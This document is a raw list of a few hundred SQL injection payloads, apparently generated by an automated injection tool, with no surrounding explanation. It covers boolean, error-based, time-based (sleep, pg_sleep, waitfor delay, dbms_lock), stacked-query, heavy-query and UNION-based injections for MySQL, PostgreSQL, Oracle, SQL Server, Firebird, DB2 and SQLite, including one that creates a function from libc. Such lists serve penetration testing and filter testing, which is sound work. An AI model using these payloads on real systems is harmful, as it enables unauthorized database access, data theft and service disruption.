+1%') and elt(4670=9403,9403) and ('%'='
+-6125'||(select 'hwnm' where 1428=1428 union all select 1428,1428,1428,1428,1428,1428#
+1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))# qmkh
+-3677')) or 1939=4484
+1'+(select ankx where 6789=6789;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#
+1) as ezje where 5234=5234 and make_set(8403=8403,8899)--
+1%')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'='
+1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('zovb' like 'zovb
+1'||(select 'feyg' from dual where 7734=7734 and 3843=6724#
+1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('lvck'='lvck
+1%"))) or 8421=(select count(*) from generate_series(1,5000000)) and ((("%"="
+1) as hlcn where 1165=1165 rlike (select * from (select(sleep(5)))vwyq)#
+1" where 5250=5250;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+-6112") union all select 8203,8203,8203,8203,8203,8203,8203--
+-3283) where 1948=1948 union all select 1948,1948,1948#
+-9929') as gbtc where 8162=8162 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1%'))) union all select null,null--
+1"))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((("twpn" like "twpn
+1'||(select 'oxdh' where 6967=6967 and sleep(5)#
+1%")) or 8466=benchmark(5000000,md5(0x694a4745)) and (("%"="
+1' where 6905=6905 union all select null,null,null,null,null,null#
+1')) as dckd where 1794=1794;select (case when (2914=3335) then 2914 else cast(1 as int)/(select 0 from dual) end) from dual--
+1")) as vigs where 6175=6175 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--
+1,iif(7475=7475,1,1/0)
+1)(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (4003=4003
+1")));select pg_sleep(5) and ((("nvuv" like "nvuv
+-9148) where 2027=2027 or 8571=8571--
+-4721') or elt(4378=5165,5165) and ('fufn'='fufn
+-4764) where 8200=8200 union all select 8200,8200,8200,8200--
+1) where 8433=8433 rlike (select (case when (7689=7689) then 1 else 0x28 end))--
+1%"))) and 4595=4595#
+1' or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
+1'||(select 'svnn' from dual where 8710=8710;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
+1) as mtda where 3951=3951;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('pbqg'='pbqg
+1') where 3767=3767 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--
+1' and 6969=(select 6969 from pg_sleep(5)) and 'lqsa' like 'lqsa
+1'+(select ksoh where 6339=6339;begin dbms_lock.sleep(5); end)+'
+-4695'))) union all select 5844,5844,5844,5844,5844,5844#
+1%" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and "%"="
+1') as xiqw where 8507=8507 rlike sleep(5)--
+-2375 union all select 1573,1573,1573,1573#
+1%"))) union all select null,null,null,null#
+-6442"))) or 3038=3038
+1");call regexp_substring(repeat(right(char(3702),0),500000000),null) and ("cwat" like "cwat
+1%";begin user_lock.sleep(5); end and "%"="
+1'||(select 'rawn' from dual where 4988=4988 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'
+1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('cfhi' like 'cfhi
+1') as yuqv where 6007=6007 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--
+-7054) as gzvf where 9146=9146 or 3038=3038
+-9429') order by 1--
+1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm
+1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('vwtq'='vwtq
+1");waitfor delay '0:0:5' and ("ludp" like "ludp
+-2181') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('wyez'='wyez
+1%'))) union all select null,null,null,null,null,null,null#
+1 union all select null,null,null,null,null--
+1%'))) union all select null,null#
+1%")) union all select null,null,null,null,null,null,null,null--
+1" where 5845=5845 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1") as semi where 4260=4260;select count(*) from generate_series(1,5000000)--
+1" where 4672=4672;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--
+1%')) and 8635=(select count(*) from generate_series(1,5000000))--
+1)) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((9542=9542
+-8710 or 9323=9323#
+-3748' where 9292=9292 or 3337=2859#
+-9135")) or 6872=6872 and (("fllx"="fllx
+1%")) and 2388=benchmark(5000000,md5(0x6d457153))#
+-8544%" or 6872=6872 and "%"="
+1%")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (("%"="
+1")) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1));waitfor delay '0:0:5' and ((7619=7619
+-2987") as iyob where 7827=7827 or (8459=8459)*4906--
+1')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--
+1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('ywbs'='ywbs
+1 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)# vojr
+1'||(select 'pygt' from dual where 5543=5543 union all select null,null,null,null,null,null#
+1'||(select 'qstz' where 6835=6835;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+1')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi
+1%') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='
+1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('ekla'='ekla
+1" and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+-9829'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('bwka'='bwka
+1' where 9605=9605 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--
+-8073))) union all select 4481,4481,4481,4481--
+1 where 6518=6518;select benchmark(5000000,md5(0x714e4153))#
+-8491" where 6107=6107 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--
+1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'nwdk' like 'nwdk
+1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'ozur'='ozur
+1'+(select 'feof' where 1966=1966;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))+'
+-1922%') union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--
+-6085 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))
+1,(select (case when (5885=1825) then 1 else 5885*(select 5885 from master..sysdatabases) end))
+1" where 9725=9725;waitfor delay '0:0:5'--
+-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--
+1'||(select 'pxkz' where 2207=2207 and (3020=3020)*6703)||'
+1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'nazb'='nazb
+-2483' where 1327=1327 union all select 1327#
+-2527)) as oqpy where 7468=7468 or 3038=3038
+1' in boolean mode) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
+1" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and "ardk" like "ardk
+1'+(select xzvf where 9727=9727;(select * from (select(sleep(5)))acdk)#
+1" and 6969=(select 6969 from pg_sleep(5)) and "ojpe" like "ojpe
+1) as qzif where 7877=7877 union all select null,null,null,null,null,null,null--
+-3505") or 5290=3436--
+1)) as kycl where 8008=8008 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1',extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))
+1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))
+-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#
+1%")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+1')) union all select null,null,null,null,null,null,null,null,null--
+1%') and make_set(1458=3902,3902) and ('%'='
+1) as hywx where 1424=1424 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'lgat' like 'lgat
+1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('czqk' like 'czqk
+1') as pwqs where 2291=2291;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+-6772")) or 9323=9323#
+-2036') or (8459=8459)*4906 and ('hjeu'='hjeu
+1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('oxvd' like 'oxvd
+1)) as fwru where 5262=5262 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1%')) or 8514=benchmark(5000000,md5(0x544d5a4c))#
+1') as wtev where 5283=5283;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+1") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ("mlld" like "mlld
+1')));select (case when (9562=5996) then 1 else 9562*(select 9562 from master..sysdatabases) end)--
+1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--
+1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1%") and (6016=4763)*4763 and ("%"="
+1') rlike (select (case when (7689=7689) then 1 else 0x28 end))
+1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('ufbr'='ufbr
+-6108') union all select 2519,2519,2519,2519--
+1")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (("nobt"="nobt
+-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#
+1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('qeet'='qeet
+1")) as ftts where 3671=3671 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1)) as uqsi where 1644=1644 and 9198=9198--
+1)) as rsnb where 3168=3168 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
+1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('wuux'='wuux
+1") as kslq where 8669=8669 and 8635=(select count(*) from generate_series(1,5000000))--
+-7568"))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((("jxge" like "jxge
+1,updatexml(2917,concat(0x2e,0x7171706a71,(select (elt(2917=2917,1))),0x717a767a71),8295)
+1");if(7899=7899) select 7899 else drop function zbbp--
+1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('zxhn' like 'zxhn
+-2393%')) union all select 2772--
+1")));begin dbms_lock.sleep(5); end and ((("zpii" like "zpii
+1')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+-3088' or 6872=6872 and 'miwk'='miwk
+1%'))) union all select null--
+-6200' where 9150=9150 union all select 9150,9150,9150,9150,9150,9150,9150#
+1%") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ("%"="
+1'))) and 7533=7533 and ((('suzd' like 'suzd
+1'||(select 'pzto' from dual where 7338=7338 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'
+1));begin user_lock.sleep(5); end and ((6874=6874
+1' or 6793=(select 6793 from pg_sleep(5)) and 'ukoc' like 'ukoc
+-1573") union all select 3928,3928,3928,3928--
+-4543") or 3038=3038
+1%'))) and 9198=9198--
+1';begin dbms_lock.sleep(5); end and 'icny' like 'icny
+1") where 6255=6255 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--
+1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('amjh'='amjh
+1%";select (case when (7005=7118) then 1 else 7005*(select 7005 from master..sysdatabases) end)--
+1')) union all select null,null#
+1') as xhmm where 8092=8092 union all select null,null,null--
+1;select (case when (2768=8868) then 2768 else cast(1 as int)/(select 0 from dual) end) from dual--
+1")) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (("dacx"="dacx
+1',(select * from generate_series(2636,2636,case when (2636=7071) then 1 else 0 end) limit 1)
+1%')) and 9198=9198--
+1"));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (("nxvp"="nxvp
+1%")));begin user_lock.sleep(5); end--
+1)) rlike (select * from (select(sleep(5)))vwyq)#
+1%' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='
+1)) union all select null,null,null,null,null,null,null,null#
+1)) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((6659=6659
+1) rlike (select (case when (5477=7492) then 1 else 0x28 end)) and (4427=4427
+1%') union all select null,null,null--
+-2033") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1') as siyk where 1514=1514 union all select null,null,null,null,null,null#
+1')) union all select null,null,null,null,null,null#
+1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo
+1%') or sleep(5)#
+1));select count(*) from generate_series(1,5000000) and ((7240=7240
+1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('cogf' like 'cogf
+-5667%')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='
+1%") union all select null,null,null,null,null,null,null,null,null--
+-9179") union all select 7144,7144,7144,7144,7144,7144,7144,7144--
+1"))) or 6793=(select 6793 from pg_sleep(5)) and ((("azmf"="azmf
+1') where 3330=3330 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1'+(select ophz where 9158=9158 rlike (select * from (select(sleep(5)))sgvo))+'
+1'||(select 'mlwj' from dual where 4247=4247 and 1702=8469)||'
+1' where 2911=2911;if(7899=7899) select 7899 else drop function zbbp--
+-5585%'))) or 6990=7727
+-4171') union all select 6136#
+1" where 4183=4183 union all select null,null,null,null,null,null--
+-2610%") union all select 7779,7779,7779,7779,7779--
+1") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ("hsaw"="hsaw
+1'||(select 'cclo' from dual where 6823=6823 and 9198=9198--
+1%")) or 4240=(select 4240 from pg_sleep(5))--
+1%"));iif(5257=5257,1,1/0)
+-9166") as hlre where 4768=4768 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--
+1) as nfgb where 2503=2503 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--
+1'||(select 'ylio' from dual where 3767=3767 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||'
+1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
+1")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (("lano"="lano
